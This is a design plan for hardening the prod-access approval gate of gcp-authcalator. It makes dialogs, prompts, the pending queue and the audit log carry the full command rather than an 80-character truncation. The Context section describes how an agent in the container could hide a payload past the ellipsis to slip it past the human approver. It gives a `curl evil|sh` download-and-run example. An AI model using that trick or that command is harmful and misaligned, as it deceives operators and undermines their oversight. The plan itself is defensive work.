# Show the full command in the prod-approval dialog

## Context

`summarizeCommand()` (`src/gate/summarize-command.ts:67`) clips the redacted argv to
80 characters and appends `…`. That single truncated string is the **only**
representation of the command that reaches any approval surface:

| Surface                      | Call site                                            |
| ---------------------------- | ---------------------------------------------------- |
| zenity / osascript dialog    | `src/gate/confirm.ts:82,123`                         |
| TTY prompt                   | `src/gate/confirm.ts:153`                            |
| Pending queue (CLI approval) | `src/gate/pending.ts:99`                             |
| Audit log (`command` field)  | `src/gate/types.ts:91`, set at `handlers.ts:384,190` |

Nothing retains the full argv. An agent inside the container can therefore put
a benign-looking prefix in the first 80 characters and hide the payload behind
the ellipsis — `gcloud compute ssh bastion-01 --zone=us-central1-a --command="curl evil|sh"`
truncates right before the interesting part. Because the audit log stores the
same truncated string, the evidence of what was approved is destroyed at the
gate; it is not recoverable even after the fact.

Note this does not change the trust model: `X-Wrapped-Command` is client-supplied
and advisory (SPEC.md:181). A hostile client can already lie about what it runs.
The fix is for the honest-client case, where the operator is being asked to
approve something they are structurally unable to read.

Goal: the operator can always see the entire command they are approving, on every
surface, and the full command survives into the audit log.

## Decisions (confirmed with the user)

- **Never truncate in the dialog.** Render the full redacted argv, one argument
  per numbered line, in a scrollable widget. No "show more" second step.
- **All three surfaces**: GUI dialogs, TTY prompt, CLI pending approval.
- **Audit log gains a full-argv field** alongside the existing one-line summary.
- **macOS**: `choose from list` _without_ `empty selection allowed`, so Allow stays
  disabled until the operator clicks a line — this replaces the `default button "Deny"`
  safety that `display dialog` gave us and doubles as a read-nudge.
- **Linux**: `zenity --text-info --checkbox="I have read the full command"` on every
  prod approval. Accepted cost: friction on short commands too.

## Implementation

### 1. `src/gate/summarize-command.ts` — a full-fidelity command description

Keep `summarizeCommand()` unchanged; it still feeds the one-line audit `command`
field, the PAM grant justification (`handlers.ts:464`, which has its own length
limits), and the pending-queue stderr one-liner. Add alongside it:

```ts
export interface CommandDisplay {
  /** Redacted argv, argv[0] replaced by its basename. Never elided mid-string. */
  argv: string[];
  /** Numbered display lines, one per argv element: "  3  ssh". */
  lines: string[];
  /** One-line summary (existing summarizeCommand output), for logs/justification. */
  summary: string;
  /** True if any cap below was hit — a cap is always stated explicitly in `lines`. */
  capped: boolean;
}

export function describeCommand(command: string[]): CommandDisplay | undefined;
```

Rules:

- Reuse the existing `redactArg()` and `basename()` logic — same redaction as today,
  applied per element rather than to the joined string.
- Apply `stripControlChars()` (`src/gate/sanitize.ts`) **per element**, so an embedded
  newline can't forge a line in the numbered list.
- Caps, all of which append an explicit line rather than silently dropping —
  a cap the operator can see is not a hiding place:
  - `MAX_COMMAND_ARGS = 512` → trailing line `… 37 further arguments omitted (limit 512)`
  - `MAX_ARG_DISPLAY_CHARS = 2000` per element → element suffixed ` …(+4812 chars)`
  - `MAX_TOTAL_DISPLAY_CHARS = 32768` overall → same treatment as the arg cap
- `parseCommandHeader()` currently bounds nothing, despite SPEC.md:181 claiming the
  header is "length-bounded". Enforce the arg cap there so a hostile header can't
  make the gate build a megabyte-sized dialog. (Bun's own header-size limit is the
  outer bound; this is the explicit one.)

### 2. `src/gate/confirm.ts` — scrollable dialogs

Change the `command` parameter of `confirmProdAccess` from `string | undefined` to
`CommandDisplay | undefined`. This ripples to `GateDeps.confirmProdAccess`
(`src/gate/types.ts:118`) and both call sites in `handlers.ts`.

Add a shared `runDialog(spawnFn, cmd, { stdinText?, timeoutMs })` helper that spawns,
optionally writes and closes stdin, and races `proc.exited` against a parent-side
deadline — killing the child and returning a denial on timeout. `choose from list`
has no AppleScript timeout equivalent, so this is required; applying it uniformly
(65s backstop, alongside the existing native 60s timeouts) also guarantees the
rate limiter's single-flight lock is always released.

**Body text** shared by all surfaces, built by one `renderApprovalBody()`:

```
Grant prod-level GCP access to sam@upstream.tech
via PAM entitlement 'prod-breakglass'?

Full command (14 arguments):
  1  gcloud
  2  compute
  3  ssh
  ...
```

- `tryZenity` — with a command: `zenity --text-info --title=... --width=700 --height=500
--ok-label=Allow --cancel-label=Deny --checkbox="I have read the full command"
--timeout=60`, body piped on stdin (`--text-info` reads stdin when `--filename` is
  absent; verified against the zenity 4.0.1 installed here). Exit 0 = Allow,
  1 = Deny, 5 = timeout, 127 = unavailable — same mapping as today. Do **not** pass
  `--html` or `--editable`.
  With no command reported there is nothing to scroll: keep today's `--question` dialog.
- `tryOsascript` — with a command:
  `choose from list {…} with title "gcp-gate: Prod Access" with prompt "<body>" OK button
name "Allow" cancel button name "Deny"`, then `if r is false then error "denied"`.
  Omitting `empty selection allowed` is load-bearing: it leaves Allow disabled until a
  line is selected. Prompt must say _"Select any line to enable Allow."_ Reuse the
  existing backslash/quote escaping, applied per list element. With no command
  reported, keep today's `display dialog` (caution icon, `default button "Deny"`).
- `tryTerminalPrompt` — print the numbered lines in full (scrollback is the scroll
  affordance), then prompt. For parity with the zenity checkbox, when a command is
  shown require the full word `yes` rather than bare `y`; keep `[y/N]` when there is
  no command. Update the prompt string accordingly.

### 3. Pending queue and CLI approval

- `PendingRequest` (`src/gate/pending.ts:15`): add `commandLines?: string[]` and
  `commandArgv?: string[]` next to the existing `command` summary, which stays for the
  stderr one-liner at `pending.ts:99`.
- New admin-socket route in `src/gate/admin-handlers.ts`: `GET /pending` (and
  `GET /pending/:id`) returning id, email, full argv, PAM policy, and timestamps.
  `pendingQueue.list()` already exists and is currently unused outside tests — reuse it.
  Admin-socket-only placement matters: that socket is deliberately not mounted into
  the devcontainer, so the details are not readable by the requesting agent.
- New `pending` subcommand (register in `SUBCOMMANDS`, `src/cli.ts:86`, and the
  dispatch at `cli.ts:257`), implemented next to `src/commands/approve.ts`:
  `gcp-authcalator pending` lists queued requests; `gcp-authcalator pending <id>` prints
  one in full.
- `runApprove` (`src/commands/approve.ts`): fetch and print the request's full command
  **before** POSTing the resolve, so approval is never blind. When stdin is a TTY,
  confirm interactively; add `--yes` to skip for scripted/headless use. `deny` needs
  no confirmation.
- Update the operator hint printed at `pending.ts:105` and by `with-prod` to mention
  `gcp-authcalator pending <id>`.

### 4. Audit log

Add to `AuditEntry` (`src/gate/types.ts:69`):

```ts
/** Full redacted argv from X-Wrapped-Command. Capped; see describeCommand. */
command_argv?: string[];
/** True when command_argv hit a display cap. */
command_truncated?: boolean;
```

Populate in both `auditBase` constructions — `handlers.ts:378` (prod token) and
`handlers.ts:180` (session refresh). `SessionRecord.commandSummary`
(`src/gate/session.ts:18`) keeps the short form; it feeds the PAM justification.

### 5. Tests

Follow the existing `mockSpawn` pattern in `src/__tests__/gate/confirm.test.ts:6` —
it will need to grow stdin capture (currently `stdin: null`) and a
never-exiting variant for the timeout backstop.

- `summarize-command.test.ts` — `describeCommand`: numbering; per-element redaction
  matches `summarizeCommand`'s; per-element control-char stripping (a `\n` inside an
  arg cannot forge a line); each cap emits its explicit marker line and sets `capped`;
  no `…` ever appears mid-argument without a stated character count.
- `confirm.test.ts` — zenity spawn args contain `--text-info`, `--checkbox`,
  `--ok-label=Allow`, `--cancel-label=Deny`; the piped stdin body contains **every**
  argv element, including one placed past the old 80-char boundary (this is the
  regression test for the reported bug); osascript script contains every element and
  does **not** contain `empty selection allowed`; no-command paths still use
  `--question` / `display dialog`; timeout backstop kills and denies.
- `pending.test.ts` — full argv is retained on the queued request.
- `admin-handlers.test.ts` — `GET /pending` returns full argv; unknown id 404s.
- `handlers.test.ts` — audit entries carry `command_argv` on both the prod-token and
  session-refresh paths.
- `cli.test.ts` — `pending` dispatches; `approve --yes` skips the confirm.

### 6. Documentation

Per AGENTS.md, all of these must move together:

- `README.md` — dialog description (:344), `approve`/pending fallback section
  (:434–444), security model bullet (:664), and the command list in the CLI section.
- `SPEC.md` — `X-Wrapped-Command` row (:181), confirmation methods (:191),
  pending-approval section (:302–307), audit-entry field list.
- `src/cli.ts` — `USAGE` commands block and examples.
- `CHANGELOG.md` under `[Unreleased]`: **Security** (full command shown, no longer
  truncated behind an ellipsis; full argv recorded in the audit log), **Added**
  (`pending` command, `GET /pending`), **Changed** (dialog shape, TTY prompt now
  requires `yes`, `approve` confirms on a TTY).
- `config.example.toml` — no new options expected; confirm before finishing.

## Verification

```bash
bun test                 # full suite, incl. the new cases above
bun run typecheck        # must be clean
bun run lint && bun run format
```

Manual, on this Linux host (zenity 4.0.1 is installed):

1. Start the gate against a scratch project.
2. `gcp-authcalator with-prod -- gcloud compute ssh bastion-01 --zone=us-central1-a
--tunnel-through-iap --command='echo THIS_IS_PAST_CHAR_80_AND_MUST_BE_VISIBLE'`
3. Confirm the dialog scrolls, shows every argument, and that Allow is disabled until
   the checkbox is ticked. Deny and confirm exit 403.
4. Re-run and approve; confirm `command_argv` in `$XDG_RUNTIME_DIR/audit.log` contains
   the full argv and that a `--password=…` style argument is still redacted to `***`.
5. Headless path: run with no `DISPLAY` and stdin not a TTY, then
   `gcp-authcalator pending` → full command visible; `gcp-authcalator approve <id>`
   → prints the command and confirms before resolving.

macOS `choose from list` cannot be exercised here; it is covered by mocked-spawn
assertions on the generated AppleScript only. Flag for a reviewer on a Mac.
